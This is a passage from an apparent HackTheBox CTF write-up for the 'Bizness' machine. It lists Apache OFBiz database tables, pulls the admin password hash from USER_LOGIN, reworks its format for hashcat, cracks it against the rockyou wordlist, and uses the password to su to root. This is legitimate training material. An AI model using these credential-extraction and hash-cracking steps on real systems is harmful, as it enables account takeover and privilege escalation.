OFBIZ               |RETURN_CONTACT_MECH           |
OFBIZ               |RETURN_HEADER                 |
OFBIZ               |RETURN_HEADER_TYPE            |
OFBIZ               |RETURN_ITEM                   |
OFBIZ               |RETURN_ITEM_BILLING           |
OFBIZ               |RETURN_ITEM_RESPONSE          |
OFBIZ               |RETURN_ITEM_SHIPMENT          |
OFBIZ               |RETURN_ITEM_TYPE              |
OFBIZ               |RETURN_ITEM_TYPE_MAP          |
OFBIZ               |RETURN_REASON                 |
OFBIZ               |RETURN_STATUS                 |
OFBIZ               |RETURN_TYPE                   |
OFBIZ               |ROLE_TYPE                     |
OFBIZ               |ROLE_TYPE_ATTR                |
OFBIZ               |RUNTIME_DATA                  |
OFBIZ               |SALARY_STEP_NEW               |
OFBIZ               |SALES_FORECAST                |
OFBIZ               |SALES_FORECAST_DETAIL         |
OFBIZ               |SALES_FORECAST_HISTORY        |
OFBIZ               |SALES_OPPORTUNITY             |
OFBIZ               |SALES_OPPORTUNITY_COMPETITOR  |
OFBIZ               |SALES_OPPORTUNITY_HISTORY     |
OFBIZ               |SALES_OPPORTUNITY_QUOTE       |
OFBIZ               |SALES_OPPORTUNITY_ROLE        |
OFBIZ               |SALES_OPPORTUNITY_STAGE       |
OFBIZ               |SALES_OPPORTUNITY_TRCK_CODE   |
OFBIZ               |SALES_OPPORTUNITY_WORK_EFFORT |
OFBIZ               |SALE_TYPE                     |
OFBIZ               |SECURITY_GROUP                |
OFBIZ               |SECURITY_GROUP_PERMISSION     |
OFBIZ               |SECURITY_PERMISSION           |
OFBIZ               |SEGMENT_GROUP                 |
OFBIZ               |SEGMENT_GROUP_CLASSIFICATION  |
OFBIZ               |SEGMENT_GROUP_GEO             |
OFBIZ               |SEGMENT_GROUP_ROLE            |
OFBIZ               |SEGMENT_GROUP_TYPE            |
OFBIZ               |SEQUENCE_VALUE_ITEM           |
OFBIZ               |SERVER_HIT                    |
OFBIZ               |SERVER_HIT_BIN                |
OFBIZ               |SERVER_HIT_TYPE               |
OFBIZ               |SERVICE_SEMAPHORE             |
OFBIZ               |SETTLEMENT_TERM               |
OFBIZ               |SHIPMENT                      |
OFBIZ               |SHIPMENT_ATTRIBUTE            |
OFBIZ               |SHIPMENT_BOX_TYPE             |
OFBIZ               |SHIPMENT_CONTACT_MECH         |
OFBIZ               |SHIPMENT_CONTACT_MECH_TYPE    |
OFBIZ               |SHIPMENT_COST_ESTIMATE        |
OFBIZ               |SHIPMENT_GATEWAY_CONFIG       |
OFBIZ               |SHIPMENT_GATEWAY_CONFIG_TYPE  |
OFBIZ               |SHIPMENT_GATEWAY_DHL          |
OFBIZ               |SHIPMENT_GATEWAY_FEDEX        |
OFBIZ               |SHIPMENT_GATEWAY_UPS          |
OFBIZ               |SHIPMENT_GATEWAY_USPS         |
OFBIZ               |SHIPMENT_ITEM                 |
OFBIZ               |SHIPMENT_ITEM_BILLING         |
OFBIZ               |SHIPMENT_ITEM_FEATURE         |
OFBIZ               |SHIPMENT_METHOD_TYPE          |
OFBIZ               |SHIPMENT_PACKAGE              |
OFBIZ               |SHIPMENT_PACKAGE_CONTENT      |
OFBIZ               |SHIPMENT_PACKAGE_ROUTE_SEG    |
OFBIZ               |SHIPMENT_RECEIPT              |
OFBIZ               |SHIPMENT_RECEIPT_ROLE         |
OFBIZ               |SHIPMENT_ROUTE_SEGMENT        |
OFBIZ               |SHIPMENT_STATUS               |
OFBIZ               |SHIPMENT_TIME_ESTIMATE        |
OFBIZ               |SHIPMENT_TYPE                 |
OFBIZ               |SHIPMENT_TYPE_ATTR            |
OFBIZ               |SHIPPING_DOCUMENT             |
OFBIZ               |SHOPPING_LIST                 |
OFBIZ               |SHOPPING_LIST_ITEM            |
OFBIZ               |SHOPPING_LIST_ITEM_SURVEY     |
OFBIZ               |SHOPPING_LIST_TYPE            |
OFBIZ               |SHOPPING_LIST_WORK_EFFORT     |
OFBIZ               |SKILL_TYPE                    |
OFBIZ               |STANDARD_LANGUAGE             |
OFBIZ               |STATUS_ITEM                   |
OFBIZ               |STATUS_TYPE                   |
OFBIZ               |STATUS_VALID_CHANGE           |
OFBIZ               |SUBSCRIPTION                  |
OFBIZ               |SUBSCRIPTION_ACTIVITY         |
OFBIZ               |SUBSCRIPTION_ATTRIBUTE        |
OFBIZ               |SUBSCRIPTION_COMM_EVENT       |
OFBIZ               |SUBSCRIPTION_FULFILLMENT_PIECE|
OFBIZ               |SUBSCRIPTION_RESOURCE         |
OFBIZ               |SUBSCRIPTION_TYPE             |
OFBIZ               |SUBSCRIPTION_TYPE_ATTR        |
OFBIZ               |SUPPLIER_PREF_ORDER           |
OFBIZ               |SUPPLIER_PRODUCT              |
OFBIZ               |SUPPLIER_PRODUCT_FEATURE      |
OFBIZ               |SUPPLIER_RATING_TYPE          |
OFBIZ               |SURVEY                        |
OFBIZ               |SURVEY_APPL_TYPE              |
OFBIZ               |SURVEY_MULTI_RESP             |
OFBIZ               |SURVEY_MULTI_RESP_COLUMN      |
OFBIZ               |SURVEY_PAGE                   |
OFBIZ               |SURVEY_QUESTION               |
OFBIZ               |SURVEY_QUESTION_APPL          |
OFBIZ               |SURVEY_QUESTION_CATEGORY      |
OFBIZ               |SURVEY_QUESTION_OPTION        |
OFBIZ               |SURVEY_QUESTION_TYPE          |
OFBIZ               |SURVEY_RESPONSE               |
OFBIZ               |SURVEY_RESPONSE_ANSWER        |
OFBIZ               |SURVEY_TRIGGER                |
OFBIZ               |SYSTEM_PROPERTY               |
OFBIZ               |TARPITTED_LOGIN_VIEW          |
OFBIZ               |TAX_AUTHORITY                 |
OFBIZ               |TAX_AUTHORITY_ASSOC           |
OFBIZ               |TAX_AUTHORITY_ASSOC_TYPE      |
OFBIZ               |TAX_AUTHORITY_CATEGORY        |
OFBIZ               |TAX_AUTHORITY_GL_ACCOUNT      |
OFBIZ               |TAX_AUTHORITY_RATE_PRODUCT    |
OFBIZ               |TAX_AUTHORITY_RATE_TYPE       |
OFBIZ               |TECH_DATA_CALENDAR            |
OFBIZ               |TECH_DATA_CALENDAR_EXC_DAY    |
OFBIZ               |TECH_DATA_CALENDAR_EXC_WEEK   |
OFBIZ               |TECH_DATA_CALENDAR_WEEK       |
OFBIZ               |TELECOM_NUMBER                |
OFBIZ               |TEMPORAL_EXPRESSION           |
OFBIZ               |TEMPORAL_EXPRESSION_ASSOC     |
OFBIZ               |TERMINATION_REASON            |
OFBIZ               |TERMINATION_TYPE              |
OFBIZ               |TERM_TYPE                     |
OFBIZ               |TERM_TYPE_ATTR                |
OFBIZ               |TESTING                       |
OFBIZ               |TESTING_CRYPTO                |
OFBIZ               |TESTING_ITEM                  |
OFBIZ               |TESTING_NODE                  |
OFBIZ               |TESTING_NODE_MEMBER           |
OFBIZ               |TESTING_REMOVE_ALL            |
OFBIZ               |TESTING_STATUS                |
OFBIZ               |TESTING_SUBTYPE               |
OFBIZ               |TESTING_TYPE                  |
OFBIZ               |TEST_FIELD_TYPE               |
OFBIZ               |THIRD_PARTY_LOGIN             |
OFBIZ               |TIMESHEET                     |
OFBIZ               |TIMESHEET_ROLE                |
OFBIZ               |TIME_ENTRY                    |
OFBIZ               |TRACKING_CODE                 |
OFBIZ               |TRACKING_CODE_ORDER           |
OFBIZ               |TRACKING_CODE_ORDER_RETURN    |
OFBIZ               |TRACKING_CODE_TYPE            |
OFBIZ               |TRACKING_CODE_VISIT           |
OFBIZ               |TRAINING_CLASS_TYPE           |
OFBIZ               |TRAINING_REQUEST              |
OFBIZ               |UNEMPLOYMENT_CLAIM            |
OFBIZ               |UOM                           |
OFBIZ               |UOM_CONVERSION                |
OFBIZ               |UOM_CONVERSION_DATED          |
OFBIZ               |UOM_GROUP                     |
OFBIZ               |UOM_TYPE                      |
OFBIZ               |USER_AGENT                    |
OFBIZ               |USER_AGENT_METHOD_TYPE        |
OFBIZ               |USER_AGENT_TYPE               |
OFBIZ               |USER_LOGIN                    |
OFBIZ               |USER_LOGIN_HISTORY            |
OFBIZ               |USER_LOGIN_PASSWORD_HISTORY   |
OFBIZ               |USER_LOGIN_SECURITY_GROUP     |
OFBIZ               |USER_LOGIN_SECURITY_QUESTION  |
OFBIZ               |USER_LOGIN_SESSION            |
OFBIZ               |USER_PREFERENCE               |
OFBIZ               |USER_PREF_GROUP_TYPE          |
OFBIZ               |VALID_CONTACT_MECH_ROLE       |
OFBIZ               |VALID_RESPONSIBILITY          |
OFBIZ               |VALUE_LINK_KEY                |
OFBIZ               |VARIANCE_REASON               |
OFBIZ               |VARIANCE_REASON_GL_ACCOUNT    |
OFBIZ               |VENDOR                        |
OFBIZ               |VENDOR_PRODUCT                |
OFBIZ               |VIDEO_DATA_RESOURCE           |
OFBIZ               |VISIT                         |
OFBIZ               |VISITOR                       |
OFBIZ               |VISUAL_THEME                  |
OFBIZ               |VISUAL_THEME_RESOURCE         |
OFBIZ               |VISUAL_THEME_SET              |
OFBIZ               |WEB_ANALYTICS_CONFIG          |
OFBIZ               |WEB_ANALYTICS_TYPE            |
OFBIZ               |WEB_PAGE                      |
OFBIZ               |WEB_PREFERENCE_TYPE           |
OFBIZ               |WEB_SITE                      |
OFBIZ               |WEB_SITE_CONTACT_LIST         |
OFBIZ               |WEB_SITE_CONTENT              |
OFBIZ               |WEB_SITE_CONTENT_TYPE         |
OFBIZ               |WEB_SITE_PATH_ALIAS           |
OFBIZ               |WEB_SITE_PUBLISH_POINT        |
OFBIZ               |WEB_SITE_ROLE                 |
OFBIZ               |WEB_USER_PREFERENCE           |
OFBIZ               |WORK_EFFORT                   |
OFBIZ               |WORK_EFFORT_ASSOC             |
OFBIZ               |WORK_EFFORT_ASSOC_ATTRIBUTE   |
OFBIZ               |WORK_EFFORT_ASSOC_TYPE        |
OFBIZ               |WORK_EFFORT_ASSOC_TYPE_ATTR   |
OFBIZ               |WORK_EFFORT_ATTRIBUTE         |
OFBIZ               |WORK_EFFORT_BILLING           |
OFBIZ               |WORK_EFFORT_CONTACT_MECH_NEW  |
OFBIZ               |WORK_EFFORT_CONTENT           |
OFBIZ               |WORK_EFFORT_CONTENT_TYPE      |
OFBIZ               |WORK_EFFORT_COST_CALC         |
OFBIZ               |WORK_EFFORT_DELIVERABLE_PROD  |
OFBIZ               |WORK_EFFORT_EVENT_REMINDER    |
OFBIZ               |WORK_EFFORT_FIXED_ASSET_ASSIGN|
OFBIZ               |WORK_EFFORT_FIXED_ASSET_STD   |
OFBIZ               |WORK_EFFORT_GOOD_STANDARD     |
OFBIZ               |WORK_EFFORT_GOOD_STANDARD_TYPE|
OFBIZ               |WORK_EFFORT_ICAL_DATA         |
OFBIZ               |WORK_EFFORT_INVENTORY_ASSIGN  |
OFBIZ               |WORK_EFFORT_INVENTORY_PRODUCED|
OFBIZ               |WORK_EFFORT_KEYWORD           |
OFBIZ               |WORK_EFFORT_NOTE              |
OFBIZ               |WORK_EFFORT_PARTY_ASSIGNMENT  |
OFBIZ               |WORK_EFFORT_PURPOSE_TYPE      |
OFBIZ               |WORK_EFFORT_REVIEW            |
OFBIZ               |WORK_EFFORT_SEARCH_CONSTRAINT |
OFBIZ               |WORK_EFFORT_SEARCH_RESULT     |
OFBIZ               |WORK_EFFORT_SKILL_STANDARD    |
OFBIZ               |WORK_EFFORT_STATUS            |
OFBIZ               |WORK_EFFORT_SURVEY_APPL       |
OFBIZ               |WORK_EFFORT_TRANS_BOX         |
OFBIZ               |WORK_EFFORT_TYPE              |
OFBIZ               |WORK_EFFORT_TYPE_ATTR         |
OFBIZ               |WORK_ORDER_ITEM_FULFILLMENT   |
OFBIZ               |WORK_REQUIREMENT_FULFILLMENT  |
OFBIZ               |WORK_REQ_FULF_TYPE            |
OFBIZ               |X509_ISSUER_PROVISION         |
OFBIZ               |ZIP_SALES_RULE_LOOKUP         |
OFBIZ               |ZIP_SALES_TAX_LOOKUP          |

877 rows selected

```

I can try `show tables in OFBIZ;`, but that only cuts it down to 854.

There’s a few interesting ones that look like they might have hashes:

```

OFBIZ               |USER_LOGIN                    |                    
OFBIZ               |USER_LOGIN_HISTORY            |                    
OFBIZ               |USER_LOGIN_PASSWORD_HISTORY   |                    
OFBIZ               |USER_LOGIN_SECURITY_GROUP     |                    
OFBIZ               |USER_LOGIN_SECURITY_QUESTION  |                    
OFBIZ               |USER_LOGIN_SESSION            |    

```

The `USER_LOGIN` table has 20 columns:

```

ij> describe OFBIZ.USER_LOGIN;
COLUMN_NAME         |TYPE_NAME|DEC&|NUM&|COLUM&|COLUMN_DEF|CHAR_OCTE&|IS_NULL&
------------------------------------------------------------------------------
USER_LOGIN_ID       |VARCHAR  |NULL|NULL|255   |NULL      |510       |NO      
CURRENT_PASSWORD    |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
PASSWORD_HINT       |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
IS_SYSTEM           |CHAR     |NULL|NULL|1     |NULL      |2         |YES     
ENABLED             |CHAR     |NULL|NULL|1     |NULL      |2         |YES     
HAS_LOGGED_OUT      |CHAR     |NULL|NULL|1     |NULL      |2         |YES     
REQUIRE_PASSWORD_CH&|CHAR     |NULL|NULL|1     |NULL      |2         |YES     
LAST_CURRENCY_UOM   |VARCHAR  |NULL|NULL|20    |NULL      |40        |YES     
LAST_LOCALE         |VARCHAR  |NULL|NULL|10    |NULL      |20        |YES     
LAST_TIME_ZONE      |VARCHAR  |NULL|NULL|60    |NULL      |120       |YES     
DISABLED_DATE_TIME  |TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
SUCCESSIVE_FAILED_L&|NUMERIC  |0   |10  |20    |NULL      |NULL      |YES     
EXTERNAL_AUTH_ID    |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
USER_LDAP_DN        |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
DISABLED_BY         |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
LAST_UPDATED_STAMP  |TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
LAST_UPDATED_TX_STA&|TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
CREATED_STAMP       |TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
CREATED_TX_STAMP    |TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
PARTY_ID            |VARCHAR  |NULL|NULL|20    |NULL      |40        |YES     

20 rows selected

```

There are three users, only one of which has a password hash:

```

ij> select USER_LOGIN_ID, CURRENT_PASSWORD, PASSWORD_HINT from OFBIZ.USER_LOGIN;
USER_LOGIN_ID      |CURRENT_PASSWORD                       |PASSWORD_HINT  
---------------------------------------------------------------------------
system             |NULL                                   |NULL           
anonymous          |NULL                                   |NULL           
admin              |$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I     |NULL           

3 rows selected

```

#### Via DBeaver

[DBeaver](https://dbeaver.io/download/) is a nice GUI database tool that has a free community edition. I’ll open it and connect to a database:

![image-20240520164610348](/img/image-20240520164610348.png)

I’ll select “Derby Embedded” and give it the path to the folder:

![image-20240520164716383](/img/image-20240520164716383.png)

Now it shows up on the left side:

![image-20240520210352925](/img/image-20240520210352925.png)

I’ll add a filter for “user” and there’s the `USER_LOGIN` table:

![image-20240520164928264](/img/image-20240520164928264.png)

Double clicking on it gives the schema in the Properties tab:

![image-20240520164955624](/img/image-20240520164955624.png)

And the data in the Data tab:

![image-20240520165023493](/img/image-20240520165023493.png)

### Crack Hash

#### hashcat

I’ll try giving the hash to `hashcat`, but it doesn’t recognize the format:

```

oxdf@corum:~/hackthebox/bizness-10.10.11.252$ hashcat ./administrator_hash 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
No hash-mode matches the structure of the input hash.
...[snip]...

```

#### Understanding Format

At the time of Bizness’ release, there was no good tool to crack this hash format (though some have come out since). To understand what I have, I’ll do some researching. I’ll come across [this 2015 post](https://issues.apache.org/jira/browse/OFBIZ-10843):

![image-20240520165637871](/img/image-20240520165637871.png)

So it’s likely SHA1. It references `cryptBytes`, a [function that looks like](https://nightlies.apache.org/ofbiz/stable/javadoc/org/apache/ofbiz/base/crypto/HashCrypt.html):

```

cryptBytes​(java.lang.String hashType, java.lang.String salt, byte[] bytes)

```

It takes a type, a salt, and bytes, and returns a hash of the format `$SHA$[stuff]$[stuff]`, the same format as my hash.

If I look at the last section of my hash, it is base64-encoded (URL-safe alphabet based on the “\_”), which decodes to 20 bytes (40 hex characters):

![image-20240520170218467](/img/image-20240520170218467.png)

That’s the length of SHA1.

#### New Hash

If `uP0_QaVBpDWFeo8-dRzDqRwXQ2I` is the base64 encoded SHA1, that leaves “d” as the salt. `hashcat` takes a format of `hash:salt`, which I can put in a file:

```

$ cat administrator_hash_mod 
b8fd3f41a541a435857a8f3e751cc3a91c174362:d

```

Now I’ll try to crack it:

```

$ hashcat ./administrator_hash_mod
hashcat (v6.2.6) starting in autodetect mode                                         ...[snip]...

The following 15 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
======+============================================================+======================================
    110 | sha1($pass.$salt)                                          | Raw Hash salted and/or iterated
    120 | sha1($salt.$pass)                                          | Raw Hash salted and/or iterated
   4900 | sha1($salt.$pass.$salt)                                    | Raw Hash salted and/or iterated
   4520 | sha1($salt.sha1($pass))                                    | Raw Hash salted and/or iterated
  24300 | sha1($salt.sha1($pass.$salt))                              | Raw Hash salted and/or iterated
    140 | sha1($salt.utf16le($pass))                                 | Raw Hash salted and/or iterated
   4710 | sha1(md5($pass).$salt)                                     | Raw Hash salted and/or iterated
  21100 | sha1(md5($pass.$salt))                                     | Raw Hash salted and/or iterated
   4510 | sha1(sha1($pass).$salt)                                    | Raw Hash salted and/or iterated
   5000 | sha1(sha1($salt.$pass.$salt))                              | Raw Hash salted and/or iterated
    130 | sha1(utf16le($pass).$salt)                                 | Raw Hash salted and/or iterated
    150 | HMAC-SHA1 (key = $pass)                                    | Raw Hash authenticated
    160 | HMAC-SHA1 (key = $salt)                                    | Raw Hash authenticated
   5800 | Samsung Android Password/PIN                               | Operating System
    121 | SMF (Simple Machines Forum) > v1.1                         | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].  

```

There’s a bunch of possible formats. I’ll try `-m 110`, which tells `hashcat` to append the salt to the end of the password and SHA1 hash it:

```

$ hashcat ./administrator_hash_mod -m 110 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting
...[snip]...
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 110 (sha1($pass.$salt))
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Mon May 20 17:36:17 2024 (1 sec)
Time.Estimated...: Mon May 20 17:36:18 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 13101.7 kH/s (6.37ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[303839373933] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 51c Fan:  0% Util: 52% Core:1965MHz Mem:7300MHz Bus:4
...[snip]...

```

It takes about 3 seconds, but doesn’t break anything. I’ll try `-m 120`, which is prepending the salt to the password and hashing:

```

$ hashcat ./administrator_hash_mod -m 120 /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting
...[snip]...
b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
...[snip]...

```

It cracks in two seconds to “monkeybizness”.

### su

That password works for root on Bizness:

```

ofbiz@bizness:/opt/ofbiz/runtime/data$ su -
Password: 
root@bizness:~#

```

And I can get `root.txt`:

```

root@bizness:~# cat root.txt
0a540d50************************

```